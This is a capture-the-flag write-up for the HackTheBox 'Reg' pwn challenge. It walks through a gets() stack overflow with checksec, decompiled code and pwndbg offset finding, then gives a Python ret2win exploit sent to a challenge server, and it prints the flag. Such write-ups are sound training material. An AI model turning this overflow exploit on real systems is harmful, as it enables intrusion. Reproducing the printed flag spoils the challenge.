---
Category:
  - Pwn
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [code-review, reversing]
---
>[!quote]
> *This is a basic buffer flow exploit. Try to get the flag.*


# Set up

-

# Information Gathering

Program workflow:

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ ./reg
Enter your name : maoutis
Registered!
```

Binary info:

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ checksec --file=reg
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80) Symbols       No    0               3               reg

┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ file reg
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped
```

## Deocompiled code

main:

```c
undefined8 main(void)

{
  run();
  return 0;
}
```

run:

```c
void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}
```

winner:

```c
void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}
```

# The Bug

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ python3 -c 'print("A"*80)' | ./reg
Enter your name : Registered!
zsh: done                python3 -c 'print("A"*80)' | 
zsh: segmentation fault  ./reg
```

# Exploitation

## Controlling RIP

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ python3 -c 'print("A"*60)' > fuzz.txt

┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ gdb -q reg
pwndbg: loaded 189 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from reg...
(No debugging symbols found in reg)
pwndbg> r < fuzz.txt
Starting program: /home/kali/CTFs/HTB/challenge/pwn/reg/reg < fuzz.txt
Enter your name : Registered!

Program received signal SIGSEGV, Segmentation fault.
...
RIP  0x41414141
...
pwndbg> quit

┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ msf-pattern_create -l 60 > offset_60.txt

┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ gdb -q reg
pwndbg: loaded 189 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from reg...
(No debugging symbols found in reg)
pwndbg> r < offset_60.txt
Starting program: /home/kali/CTFs/HTB/challenge/pwn/reg/reg < offset_60.txt
Enter your name : Registered!

Program received signal SIGSEGV, Segmentation fault.
...
RIP  0x39624138
...
pwndbg> quit

┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ msf-pattern_offset -l 80 -q 39624138
[*] Exact match at offset 56
```

## Extracted memory location for winner()

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ gdb -q reg
pwndbg: loaded 189 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from reg...
(No debugging symbols found in reg)
pwndbg> disas winner
Dump of assembler code for function winner:
   0x0000000000401206 <+0>:     push   rbp
   0x0000000000401207 <+1>:     mov    rbp,rsp
   0x000000000040120a <+4>:     sub    rsp,0x410
   0x0000000000401211 <+11>:    lea    rdi,[rip+0xdec]        # 0x402004
   0x0000000000401218 <+18>:    call   0x401030 <puts@plt>
   0x000000000040121d <+23>:    lea    rsi,[rip+0xdf1]        # 0x402015
   0x0000000000401224 <+30>:    lea    rdi,[rip+0xdec]        # 0x402017
   0x000000000040122b <+37>:    call   0x4010a0 <fopen@plt>
   0x0000000000401230 <+42>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401234 <+46>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401238 <+50>:    lea    rax,[rbp-0x410]
   0x000000000040123f <+57>:    mov    esi,0x400
   0x0000000000401244 <+62>:    mov    rdi,rax
   0x0000000000401247 <+65>:    call   0x401070 <fgets@plt>
   0x000000000040124c <+70>:    lea    rax,[rbp-0x410]
   0x0000000000401253 <+77>:    mov    rdi,rax
   0x0000000000401256 <+80>:    call   0x401030 <puts@plt>
   0x000000000040125b <+85>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040125f <+89>:    mov    rdi,rax
   0x0000000000401262 <+92>:    call   0x401040 <fclose@plt>
   0x0000000000401267 <+97>:    nop
   0x0000000000401268 <+98>:    leave
   0x0000000000401269 <+99>:    ret
End of assembler dump.
```

## Final Exploit

```python
#!/usr/bin/python
import struct
import sys
import socket

ip = '138.68.182.108'
port = 30496

crash = 60
EIP = struct.pack("I", 0x0000000000401206)	# winner() function
offset = "\x41" * 56
exploit = offset + EIP

print "Exploit: " + ''.join("\\x" + x.encode('hex') for x in exploit)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print resp
s.send(exploit+"\n")
resp = s.recv(1024)
print resp
s.close()
```

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/pwn/reg]
└─$ python pwn.py
Exploit: \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x06\x12\x40\x00
Enter your name :
Registered!
Congratulations!
HTB{N3W_70_pWn}
```

# Flag

>[!success]
>`HTB{N3W_70_pWn}`

